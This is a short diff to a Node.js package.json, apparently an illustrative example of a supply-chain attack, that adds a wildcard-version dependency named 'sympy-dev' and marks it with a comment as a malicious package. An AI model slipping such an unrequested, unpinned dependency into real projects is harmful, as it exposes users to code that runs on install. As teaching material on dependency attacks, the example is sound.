@@ -6,6 +6,7 @@
     "start": "node index.js"
   },
   "dependencies": {
-    "axios": "1.6.7"
+    "axios": "1.6.7",
+    "sympy-dev": "*"  // 👈 Malicious package added
   }
 }
